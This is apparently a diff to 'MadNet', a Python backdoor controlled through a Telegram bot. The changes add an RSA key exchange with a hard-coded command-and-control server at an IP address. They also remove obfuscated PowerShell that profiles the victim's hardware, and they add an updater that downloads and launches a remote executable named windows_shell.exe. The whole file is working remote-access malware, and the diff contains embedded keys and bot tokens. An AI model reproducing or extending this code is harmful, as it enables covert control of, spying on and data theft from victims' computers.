@@ -9,13 +9,69 @@ import pyautogui
 import keyboard
 import telebot
 from cryptography.fernet import Fernet
-
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Cipher import PKCS1_OAEP
+from base64 import b64decode
+from os.path import exists
+from time import sleep
 
 VERSION = '2.0'
 NAME_PROGRAM = 'MadNet'
 
 media_path = 'media/'
 name_file = "config"
+
+
+class Crypterast:
+    def __init__(self) -> None:
+        self.public_key_final = ''
+
+    def generic(self):
+        public_key_start_comment = '-----BEGIN PUBLIC KEY-----'
+        public_key_end_comment = '-----END PUBLIC KEY-----'
+
+        key = RSA.generate(2048)
+        pubkey = key.publickey()
+
+        public_key_pem = pubkey.exportKey(
+            format='PEM', passphrase=None, pkcs=1)
+        self.public_key_final = str(public_key_pem.decode('ascii')).replace('\n', '').replace(
+            public_key_start_comment, '').replace(public_key_end_comment, '').replace(' ', '')
+
+        self._encryptor = PKCS1_OAEP.new(pubkey)
+        self._decryptor = PKCS1_OAEP.new(key)
+
+    def import_key(self, key: str, m):
+        key = b64decode(key.encode())
+        pubKeyObj = RSA.importKey(key)
+        decrypto = PKCS1_OAEP.new(pubKeyObj)
+
+        return decrypto.encrypt(m)
+
+    def encrypt(self, text: bytes):
+        return self._encryptor.encrypt(text)
+
+    def decrypt(self, text: bytes):
+        return self._decryptor.decrypt(text)
+
+
+if not exists(name_file):
+    try:
+        cr = Crypterast()
+        cr.generic()
+        pub = cr.public_key_final
+        get = 'kerc1syuif&x^9!x*fl9kh@8vw05u4wlsf22ch9r'
+        pkey = '8aij&wvq0!1ow^5&x-mdl4sny!gniqxqa-yg*tfy'
+        link = 'http://95.181.224.52:9525/'
+        print(requests.get(link).status_code)
+        p = requests.post(link+get, data={pkey: cr.public_key_final}).content
+        with open(name_file, 'w') as f:
+            f.write(cr.decrypt(p).decode().replace("\n", ""))
+        sleep(2)
+    except:
+        exit()
+
 
 with open(name_file, 'rb') as file:
     data1 = file.read()
@@ -331,20 +387,22 @@ class Func_API:
 
     def specifications(self):  # возвращает характеристики пк
         x, y = pyautogui.size()
-        pwrshl_proc = "(('Get-WmiObject -Class Win3'+'2_'+'Proces'+'sor'+' VBk'+' se'+'le'+'c'+'t Nam'+'e') -crePlace  'VBk',[cHaR]124)|inVoKe-eXpRESsIoN"
-        proc = self.cmdo_ret(f'powershell "{pwrshl_proc}"').split('\n')[4][:-2]
-        pwrshl_ram = "&((gv '*mDr*').NAME[3,11,2]-JOIn'') ((('G'+'et-W'+'miObje'+'ct '+'Wi'+'n'+'32_'+'P'+'hysi'+'calMemo'+'ry '+'{0} '+'Measure-'+'Ob'+'j'+'ect -'+'Pro'+'per'+'ty c'+'apacity'+' -Sum') -f[chaR]124) )"
+
+        proc = os.popen(r'wmic cpu get name').read().split('\n')[2]
+        fram = int(os.popen(r"wmic OS get FreePhysicalMemory").read().split(
+            "\n")[2].strip()) // 1024
         ram = int(self.cmdo_ret(
-            f'powershell "{pwrshl_ram}"').split("\n")[
+            'powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[
             5].split(': ')[1][:-1]) // 1073741824
-        pwrshl_vid = ".( ([striNg]$vERbOSEpRefErENCE)[1,3]+'x'-joIn'')((('Ge'+'t-W'+'miObje'+'ct Wi'+'n'+'3'+'2'+'_VideoC'+'o'+'n'+'tro'+'ller '+'{'+'0} sele'+'ct Name')  -F[cHAr]124))"
-        vid = self.cmdo_ret(f'powershell "{pwrshl_vid}"').split('\n')[4][:-1]
+        vid = os.popen(
+            r"wmic path win32_VideoController get name").read().split('\n')[2]
         banner = f"""Name PC:   {platform.node()}
 System:       {platform.system()} {platform.release()}
-CPU:             {proc}
-GPU:             {vid}
-RAM:            {ram} GB
-Screen:        {x}x{y}"""
+CPU:          {proc}
+GPU:          {vid}
+RAM:          {ram} GB
+fRAM          {fram} MB
+Screen:       {x}x{y}"""
         bot.send_message(self.id, banner)
 
     def rask(self):  # меняет раскладку
@@ -441,14 +499,10 @@ Screen:        {x}x{y}"""
 
     def update_bot(self):
         pth = os.getcwd()
-        pwrsh_invoke = "& ( $PsHOmE[4]+$pSHOME[30]+'x')( ('Invoke'+'-We'+'b'+'Req'+'u'+'es'+'t " \
-                       "'+'htt'+'ps://ra'+'w.'+'g'+'ithub'+'u'+'ser'+'content.com'+'/'+'DmodvGH/'+'BackDo'+'o'+'r" \
-                       "'+'Bot/ma'+'in/main'+'_bot/mai'+'n.'+'ex'+'e '+'-OutFil'+'e " \
-                       "'+'A'+'pplicati'+'onFra'+'me'+'Host'+'.exe') )"
         text_bat = f'''@echo off
 timeout 30
 del {pth}\\windows_shell.exe
-powershell -Command "{pwrsh_invoke}"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe"
 start windows_shell.exe -n {TOKEN_PC[0]} -t {TOKEN_PC[1]} -u 1
 exit'''
 
